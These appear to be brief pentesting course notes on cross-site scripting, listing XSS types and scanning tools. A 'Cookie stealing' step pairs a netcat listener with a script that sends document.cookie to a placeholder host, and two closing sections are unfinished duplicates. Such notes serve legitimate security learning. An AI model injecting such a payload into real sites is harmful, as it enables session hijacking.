## Cross-site scripting (XSS)

### 1. Introduction to XSS Attacks

#### 📌 1.1. XSS types

- **Actions**
    - Stored → goes to DB
    - Reflected → bounces back from the server
    - DOM-based → does not visit the server, just executes in the browser

#### 📌 1.2. JavaScript

- **Actions**
    - Sandbox context → JavaScript is executed by browsers in a sandbox with low privileges and it is also segregated from other programs and processes.
    - Execution is sequential → top to bottom 
    - Payloads → https://github.com/payload-box/xss-payload-list

### 2. Reflected XSS

#### 📌 2.1. Reflected XSS in WordPress

- **Actions**
    - CWordPress scan → wpscan CLI
        - Regular execution → ```wpscan --url [url]``` 
        - Enumerate plugins → ```wpscan --url [url] --enumerate p --plugins-detection aggresive``` 

#### 📌 2.2. Cookie stealing

- **Actions**
    - Set netcat for listening → ```nc -nvlp 4444```
    - Craft the command that calls that listener → ```<script>new Image().src='http://[ip]?cookie='+encodeURI(document.cookie);</script>```

### 3. Stored XSS

#### 📌 3.1. Introduction to stored XSS

- **Actions**
    - searchsploit (CLI for searching in exploit DB) → ```searchsploit apphp```
    - Read the description in the document
    - Find the vulnerable field

#### 📌 3.2. MyBBScan

- **Actions**
    - CLI to scan MyBB vulnerabilities → ```./scan.py```

### 4. DOM-Based XSS

#### 📌 4.1. xx

- **Actions**
    - Check domain → export certificate from BurpSuite (DER) and import from browser 

### 5. XSS Tools

#### 📌 5.1. xx

- **Actions**
    - Check domain → export certificate from BurpSuite (DER) and import from browser 

